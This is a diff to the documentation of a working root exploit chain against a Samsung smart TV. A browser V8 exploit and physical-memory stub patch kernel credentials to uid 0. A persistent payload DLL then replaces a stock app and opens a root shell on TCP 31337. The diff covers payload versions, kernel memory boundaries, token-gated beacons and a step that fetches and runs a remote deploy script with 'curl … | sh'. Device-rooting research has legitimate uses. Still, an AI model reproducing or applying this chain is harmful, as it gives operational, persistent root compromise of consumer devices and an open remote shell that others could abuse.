@@ -35,8 +35,8 @@ channel on TCP 31337 (line protocol, replies end with `__END__`).
 
 | | |
 |---|---|
-| Payload | repo **v39.2** (`010946ff…`, 33,280 B) built 2026-10-26. **TV is on v39.2** (deployed 22:48 over 31337; `payload_backup.dll` keeps v37 `968e1154…`, stock IL `mcs_orig.dll` intact). **Cold boot verified 22:55**: attempt 1 `fast-exit` t=29, attempt 2 `self-patch` t=38, `SUCCESS-R00T` t=39, `ROOTCHAN` t=40. |
-| Boot-to-root | **Attempt 2 is the floor; v37 cold boot 37 s; v39.2 cold boot 39 s.** v39.2: deploy 22:48 reload-rooted in 6 s; a real cold boot at 22:54:46 rooted at t=39 (attempt 1 `fast-exit` t=29, attempt 2 `self-patch` t=38, `ROOTCHAN` t=40). Earlier v37: stock cycle passed with the retry loop, cold boot at t=37. v35: 37 s; v34: 34 s and 68 s; v33: 38-39 s; v32: 59 s; v31: 132 s. Marker: `share/root_boot.txt` |
+| Payload | repo **v41** (`1ab4343e…`, 33,792 B), deployed 2026-10-27; every beacon carries `tok=<rootchan.token>` (live `c1eadc03`; forged/absent tokens refused). **TV is on v41**; `payload_backup.dll` keeps the previous build and stock IL `mcs_orig.dll` is intact. A v41 cold boot and the uninstall cycle are still owed. |
+| Boot-to-root | **Attempt 2 is the floor; v37 cold boot 37 s; v39.2 cold boot 39 s; v41 restart ~1 s.** v41 (2026-10-27) restart-rooted in ~1 s (`self-patch`, `tok=c1eadc03`); a v41 **cold boot** is still owed. v39.2: deploy reload-rooted in 6 s, cold boot at t=39. Earlier v37: cold boot t=37; v35: 37 s; v34: 34/68 s; v33: 38-39 s; v32: 59 s; v31: 132 s. Marker: `share/root_boot.txt` |
 | Root identity | `uid=0`, `CapEff=0x3fffffffff`, running under the app's own SMACK label |
 | Boot hook | a `boot_sequence` row in `/opt/dbspace/user/5001/.appsvc.db` |
 | Device | physmap nodes `/dev/video40` (jpeg), `/dev/video30` (hen, the browser stub) and `/dev/video60` (dvde). Exclusivity is **per instance**, but the payload may only **retry video40** on `EBUSY`: video30 hangs at phys `0x46000000` and the payload's scans reach `0x60000000`, so switching nodes on a busy video40 would break the boot (review 2026-10-26). video30/video60 are tried only when a node reports `ENOENT`/`ENODEV`. The app runs as uid 5001, gid 44 |
@@ -95,17 +95,17 @@ does the same when a slot re-protect fails. One-time beacon per process:
 The kernel is **not LPAE**: `CONFIG_ARM_LPAE` is unset, `CONFIG_VMSPLIT_3G=y`,
 `CONFIG_PAGE_OFFSET=0xC0000000`, `CONFIG_HIGHMEM=y` (reference tree,
 `firmware/gpl/kernel_src/linux-5.4/.config`). The linear map covers **lowmem
-only**; with `PHYS_OFFSET 0x20000000`, `VA = PA + 0xA0000000`. Measured on the
-live set (2026-10-26, v39.2 session): `MemTotal 1,816,840 kB`,
-`LowTotal 604,424 kB`, `HighTotal 1,212,416 kB`, so lowmem ends at phys
-`0x44E42000` and `high_memory` is **~VA `0xE4E42000`** - `0xE0000000` is
-*inside* the map, not the end of it. Above `high_memory` is vmalloc/module
-space where `va - 0xA0000000` is not a translation: a value there is a garbage
-read, not a high allocation. v31's 0/21 high creds and 0/81 high task pointers
-are consistent with garbage pointers rather than a `0xE0000000` wall; the exact
-`high_memory` variable and a deliberate high-PA read are still unmeasured. None
-of this changes attempt 2 being the floor. Do not add more rounds/waits for
-attempt 1.
+only**; with `PHYS_OFFSET 0x20000000`, `VA = PA + 0xA0000000`. `/proc/zoneinfo`
+is the ground truth (2026-10-27): Normal `start_pfn 0x20000`, HighMem
+`start_pfn 0x50400`, so `max_low_pfn = 0x50400` and `high_memory` is
+**VA `0xF0400000`** (`p2v(0x50400000)`). `meminfo` is vendor-adjusted here
+(HighTotal 303,104 pages > HighMem present 198,656), so the earlier
+meminfo-derived `0xE4E42000` estimate was wrong. The `0xE0000000` read failures
+are therefore **inside** the linear map: the video40 DMA window (~512 MiB,
+matching "reads past 0x46000000 hang") is the prime suspect, not the CPU map.
+A high task/cred value is still treated as a garbage read (v31: 0/21 high creds,
+0/81 high task pointers), and the v38 `high-scan` verdicts must be re-read
+against `0xF0400000`. Attempt 2 remains the floor; do not add rounds/waits.
 
 Diagnostic beacons (fifth pass, `docs/OPEN-ISSUES.md`): the `child=` line now carries
 `pu=` (the latched child's parent-cred uid), and while the direct-parent patch gate
@@ -248,7 +248,7 @@ TV boot: com.samsung.tv.MultiControl-Service (dotnet-inhouse, app_onboot)
 | `server/index.html` | page that loads the browser chain |
 | `server/payloads/browser_payload.js` | browser V8 payload (hdbreaker chain + physrpc) |
 | `server/lib/wasm_builder.js` | WasmGC helper used by the payload |
-| `server/deploy.sh` | deploy TEMPLATE (`H=@HOST@`, `WANT=@WANT@`, `SIZE_WANT=@SIZE@`), rendered per request by `server.py`; transactional with rollback |
+| `server/deploy.sh` | deploy TEMPLATE (`H=@HOST@`, `WANT=@WANT@`, `SIZE_WANT=@SIZE@`, `@BEACON_TOKEN@`), rendered per request by `server.py`; transactional with rollback |
 | `server/uninstall.sh` | restores the stock app (run via the channel); relabels before `mv`, removes the allowlist last |
 | `server/payload.dll` | the root-on-boot payload served to the TV |
 | `tools/physmap.py` | RPC client (hello, read/write, ops) |
@@ -275,7 +275,7 @@ TV boot: com.samsung.tv.MultiControl-Service (dotnet-inhouse, app_onboot)
 | `tools/test_logs.py` | offline: beacon-analyzer fixtures (log **and** the on-TV marker), tool error paths, ps1 parse guard |
 | `tools/test_constants.py` | cross-checks the same offsets/limits/node names across `Program.cs`, `sim_rpc.py`, `kernel_root.py`, `physmap.py`, `physrpc.S`, the page and `deploy.sh` |
 | `tools/test_all.py` | runs every layer above; `--tv` adds the live stub |
-| `payload/Program.cs` | boot payload source (v39.2; TV runs v39.2 since 2026-10-26) |
+| `payload/Program.cs` | boot payload source (v41; TV runs v41 since 2026-10-27) |
 | `payload/global.json` | pins SDK 10.0.301 (rollForward latestPatch): a different SDK can change the artifact md5 |
 | `payload/BootPayload.csproj` | net6.0 project, assembly `MultiControlService` |
 | `root.ps1` | one-command runner (server + root + deploy + verify) |
@@ -355,12 +355,12 @@ shell - that corrupts the stream and wastes the page load.
 duplicate an inventory here.
 
 `server/payload.dll` is the artifact the TV fetches during deploy and is
-byte-identical to `payload/out/MultiControlService.dll` (md5 `010946ff…`, v39.2;
+byte-identical to `payload/out/MultiControlService.dll` (md5 `1ab4343e…`, v41;
 reproducible — see §9), so a clone runs without a .NET SDK. Rebuild with
 `dotnet build payload/BootPayload.csproj -c Release -o out`, then copy it over
 `server/payload.dll`; there is **no `WANT=` constant to update** any more — the
 server renders the hash/size into `deploy.sh` per request from the file it serves.
-`server/deploy.sh` is a TEMPLATE (`H=@HOST@`, `WANT=@WANT@`, `SIZE_WANT=@SIZE@`);
+`server/deploy.sh` is a TEMPLATE (`H=@HOST@`, `WANT=@WANT@`, `SIZE_WANT=@SIZE@`, `@BEACON_TOKEN@`);
 serving it from a plain static server is refused (`NEED_RENDER`), so the stale
 generated-copy class (v37/v38 `deploy_local.sh`) cannot recur.
 
@@ -405,7 +405,7 @@ python run_root.py "id" 6               # uid=0(root)
 #    from the address the TV used and WANT=/SIZE_WANT= from the payload.dll it
 #    serves, so there is no generated copy to go stale (the old deploy_local.sh).
 python run_root.py "curl -s http://<HOST_IP>/deploy.sh | sh" 45
-#    expect: UID=0, SIZE=33280, MD5=010946ff..., COPY=ok, HOST_FILE=..., DEPLOY_DONE
+#    expect: UID=0, SIZE=33792, MD5=1ab4343e..., COPY=ok, HOST_FILE=..., DEPLOY_DONE
 
 # 5. reboot the TV (exit the browser first so it does not restore the page)
 
@@ -423,7 +423,7 @@ gateway, deploy/uninstall control flow, source↔blob↔page consistency). Then:
 
 - [x] `root_shell.py "id" <TV_IP>` returns `uid=0(root)` - **verified 2026-10-26**.
 - [x] `root_shell.py "cat /proc/self/status | grep CapEff" <TV_IP>` → `0000003fffffffff` - **verified 2026-10-26**.
-- [x] `root_shell.py "md5sum /opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll" <TV_IP>` → `010946ff…` (verified 2026-10-26 22:48; `payload_backup.dll` is v37 `968e1154…`)
+- [x] `root_shell.py "md5sum /opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll" <TV_IP>` → `1ab4343e…` (verified 2026-10-27; `payload_backup.dll` is v39.2 `010946ff…`)
 - [x] Cold boot with the browser closed → attempt 1 high exits in ~2 s (v39.2, 2026-10-26: **39 s**, attempt 1 `fast-exit` t=29, attempt 2 `self-patch` t=39, `ROOTCHAN` t=40) (`high-alloc … fast-exit`), attempt 2 roots; v37 cold boot observed **37 s** (attempt 2; attempt 1 `seen=0`); v35: 37 s; v34: 34 s and 68 s. Attempt-1 `SUCCESS` is a bonus; attempt 2 is the floor, but a slow hunt can push to attempt 3.
 - [ ] `kill -9 <app pid>` → channel back in ~5–45 s (v33's high-alloc gate skips a high attempt quickly; otherwise attempt 2 roots), still uid 0.
 - [x] `python tools/test_all.py --tv` against a fresh page load (stub protocol
@@ -445,13 +445,13 @@ gateway, deploy/uninstall control flow, source↔blob↔page consistency). Then:
    `O_RDONLY` skips the busy check (diagnostics only: `PROT_WRITE` needs RDWR).
 4. **`fork()` copies the cred.** Patch the parent found via `real_parent`, not
    the child.
-5. **Do not read a kernel pointer above the lowmem end (~`0xE4E42000`).** The kernel is VMSPLIT_3G
+5. **Do not read a kernel pointer above the lowmem end (`0xF0400000`).** The kernel is VMSPLIT_3G
    with HIGHMEM (`CONFIG_ARM_LPAE` unset), so the linear map ends at
-   `high_memory` — **measured ~`0xE4E42000`** (LowTotal 604,424 kB) — and anything
+   `high_memory` — **measured `0xF0400000`** (zoneinfo `max_low_pfn 0x50400`; meminfo is vendor-adjusted) — and anything
    above it is vmalloc/module space where `va - 0xA0000000` is not a valid
    translation. A value above that boundary is a garbage read, not a high allocation
-   (v31: 0/21 high creds, 0/81 high task pointers; note `0xE0000000` is *inside*
-   the measured map, so the old 0xE0000000 line was a prediction, not a limit). Keep accepting
+   (v31: 0/21 high creds, 0/81 high task pointers; `0xE0000000` is well *inside*
+   the map - its read failures are the video40 DMA window, not a map end). Keep accepting
    the full kernel range for POINTER SHAPE, but do not expect to read there.
 6. **Post-fork managed code.** Use a pre-pinned buffer + raw
    `syscall(172,15,…)` in the child; a CLR allocation can deadlock.
@@ -503,10 +503,10 @@ gateway, deploy/uninstall control flow, source↔blob↔page consistency). Then:
     lost attempt 1. Kill leftover landmarks so a real init-reparented orphan is
     in `pre` and never looked at.
 16. **A high-half read is a garbage read, not a slow allocation.** Every coherent
-    task/cred read in the v30/v31 cold-boot logs was `< 0xE0000000`; with
-    VMSPLIT_3G + HIGHMEM the linear map ends at `high_memory` (measured
-    ~`0xE4E42000`, not `0xE0000000`), so a value above it is vmalloc space where
-    `va - 0xA0000000` is meaningless. Attempt 1's fresh process does not "re-roll
+    task/cred read in the v30/v31 cold-boot logs was `< 0xE0000000`, but
+    `high_memory` is **`0xF0400000`** (zoneinfo), so that line is inside the map;
+    the failures are the video40 DMA window (~512 MiB), not a map end. Attempt 1's
+    fresh process does not "re-roll
     into a readable high allocation" — it re-rolls into lowmem. Do **not** "fix"
     attempt 1 with more rounds/waits (v31's 10 s last wait booted in 132 s vs
     v30's 51 s); v33's `high-alloc` gate fast-exits in ~2 s and the fifth pass is
@@ -539,7 +539,7 @@ Then deploy it with the browser root channel (`write_root.py` or a `deploy.sh`
 that downloads it) and reboot. Things to preserve when editing `Program.cs`:
 
 - `Kptr(v) => v >= 0xC0000000` for pointer shape (accept the full kernel range,
-  trap 5). Do **not** expect to read above the lowmem end (~`0xE4E42000`): v31
+  trap 5). Do **not** expect to read above the lowmem end (`0xF0400000`): v31
   cold-boot evidence is 0/21 high creds coherent, 0/81 high task pointers, and a
   value there is a garbage read, not a readable high allocation.
 - Child tag via `GCHandle`-pinned bytes + `syscall(172, 15, ptr, 0,0,0,0)`.
@@ -605,7 +605,7 @@ that downloads it) and reboot. Things to preserve when editing `Program.cs`:
   After a payload change: copy `payload/out/MultiControlService.dll` over
   `server/payload.dll`; the deploy gate is rendered from that file, so there is
   no `WANT=` to update by hand.
-- **v39.2 hardening to preserve:** the device open retries **video40** on
+- **v41 hardening to preserve:** the device open retries **video40** on
   `EBUSY` for the whole budget and advances to `video30`/`video60` only on
   `ENOENT`/`ENODEV`, beaconing on state change plus one "still waiting" line per
   30 s (never per attempt, never at 1 s); `Run()` uses a unique temp file per
@@ -615,7 +615,10 @@ that downloads it) and reboot. Things to preserve when editing `Program.cs`:
   paths and long-mode idle close the device; `RootChannel` retries a failed bind
   and stops the listener that threw; auto-update-off runs on a background
   thread; capability writes happen **only** after an ids write that started from
-  uid 5001; a failed reopen names `_node`, not a hardcoded video40.
+  uid 5001; a failed reopen names `_node`, not a hardcoded video40.  **v41:** the
+  payload reads `rootchan.token` (deploy-rendered, 0644) and prefixes every
+  beacon with `tok=`; the server refuses an unknown token and never admits a
+  token-less beacon to the shell slot.
 
 ## 10. Recovery
 
@@ -644,19 +647,14 @@ that downloads it) and reboot. Things to preserve when editing `Program.cs`:
 ## 11. Open work
 
 - ~~Bind 31337 to a single address~~ — **done in v16**: the listener binds the TV address derived from the route to the recorded PC (re-derived every 30 s, `Any` fallback with a beacon if there is no route), so it is off Wi-Fi Direct/tethering while staying portable. `/proc/net/tcp` shows the TV's own address on 31337, not `00000000:7A69`.
-- **Pending: high-half read mechanism — the config now has a falsifiable story.**
-  `CONFIG_ARM_LPAE` is unset and `CONFIG_VMSPLIT_3G=y` + `CONFIG_HIGHMEM=y`, so
-  the linear map is lowmem only; the live `meminfo` puts lowmem at 604,424 kB, so
-  `high_memory` is ~VA `0xE4E42000` (not `0xE0000000`) and a pointer above that
-  was never a task.
-  This is consistent with every measurement (0/21 high creds, 0/81 high task
-  pointers; `0xFF` = unbacked) but is still inference from a config file. Two
-  falsifiable checks on the next connected session: (a) read `high_memory` and
-  `max_low_pfn` from the running Image (`.bss`; anchor the build→running delta
-  on the located `init_task`, require `high_memory == 0xA0000000 +
-  max_low_pfn*0x1000`), and (b) one deliberate high-PA read (e.g. `0x40000000`,
-  highmem) to settle `recon/tvphys.py:251-253`'s claim that high reads
-  succeeded on 2026-10-22. Neither changes attempt 2 being the floor.
+- **High-half read mechanism — boundary corrected by zoneinfo; DMA window suspect.**
+  `/proc/zoneinfo` has Normal `start_pfn 0x20000`, HighMem `start_pfn 0x50400`,
+  so `high_memory` is **VA `0xF0400000`**; `meminfo` is vendor-adjusted, which is
+  why the earlier `0xE4E42000` estimate was wrong. The `0xE0000000` read failures
+  are inside the map and point at the video40 DMA window (~512 MiB, matching
+  "reads past 0x46000000 hang"). One deliberate high-PA read and a re-read of the
+  v38 `high-scan` verdicts against `0xF0400000` are still worth doing; neither
+  blocks attempt 2.
 - **Pending: portability.** No second model/firmware has been tested. Use the
   four gates and the file-by-file checklist in `docs/PORTABILITY.md`; record each
   unit there.
@@ -665,27 +663,16 @@ that downloads it) and reboot. Things to preserve when editing `Program.cs`:
   `auto_root` requested a reload, `RSET` the gateway, waited for the fresh stub,
   and attempt 2 rooted and deployed v37 (`COPY=ok`). The following cold boot
   rooted at t=37. The retry prompt is the manual fresh-page recovery, automated.
-- **Pending: 31337 is an unauthenticated LAN root shell.** The allowlist is the
-  only filter on the channel. The PC-side server now also: answers non-served HTTP
-  methods with 405 instead of treating them as the shell, accepts the interactive
-  shell slot only from a peer that has announced itself (`PGDB`/`DSHROOT`), caps
-  the stub queue, and refuses cross-origin `/save`. **v40:** the `PGDB` handshake
-  now carries a per-run token (page-generated, announced via `POST /pair`,
-  patched into the stub's `TOK1` placeholder and sent as the 4 bytes after
-  `PGDB`, before the device open); an unannounced or mismatched stub is refused
-  and never joins `TV_PEERS`. **Live-validated 2026-10-27**: announced
-  `c7eeacdb`, stub connected/paired, `test_all.py --tv` 10/10. The page also
-  re-captures the wrapper before the single `cw` (heap move made the trigger
-  return `'DIV'` on fresh loads). **Still open:** a forged `DSHROOT` beacon still
-  joins `TV_PEERS` (and `beacons.log` forgery) - that needs a payload-side
-  token, not a server change. Keep the set off untrusted networks; see
-  `SECURITY.md`.
-- **Pending: public-release maintenance.** `LICENSE` covers original work only;
-  the browser-chain files are third-party (`NOTICE.md`). The baked addresses are
-  now TEST-NET placeholders (`192.0.2.1`); `tools/sanitize_for_public.py`
-  (ported 2026-10-26) is the checker - run `python tools/sanitize_for_public.py
-  --check` before publishing (it exits 1 on any private token). Remaining: the
-  token/tool pass over docs and examples it reports; keep `server/deploy.sh`'s
+- **31337 is still a LAN root shell for allowlisted peers.** The allowlist is
+  the only filter on the channel itself. Both handshakes are now token-gated:
+  the `PGDB` stub pairing (v40, live 2026-10-27, `c7eeacdb`) and every `DSHROOT`
+  beacon (v41, live 2026-10-27, `tok=c1eadc03` from `rootchan.token`); unknown
+  tokens are refused and token-less beacons never join `TV_PEERS`. Residual: a
+  peer that is on the allowlist can still connect to 31337. Keep the set off
+  untrusted networks; see `SECURITY.md`.
+- **~~Public-release maintenance~~ - done 2026-10-27.** The baked addresses are
+  TEST-NET placeholders (`192.0.2.1`) and `tools/sanitize_for_public.py --check`
+  passes on the tree. Re-run it before publishing; keep `server/deploy.sh`'s
   markers intact.
 - ~~Clamp the stub's client-controlled lengths~~ — **done**: `physrpc.S` bounds
   READ/WRITE32/READMANY/RUN/FILE, refuses with -EINVAL, and ends the stub for the
@@ -719,7 +706,7 @@ rooted set risks the root; the warning to keep auto-update off remains).
 ### Caveats for a fresh clone
 
 - **`server/deploy.sh` is a template, not a script to serve from disk.** `H=@HOST@`,
-  `WANT=@WANT@` and `SIZE_WANT=@SIZE@` are rendered by `server.py` per request
+  `WANT=@WANT@`, `SIZE_WANT=@SIZE@` and `@BEACON_TOKEN@` are rendered by `server.py` per request
   (the address the TV used + the hash/size of the `payload.dll` actually served).
   A static server leaves the markers in place and the script refuses with
   `NEED_RENDER`; there is no generated `deploy_local.sh` any more.
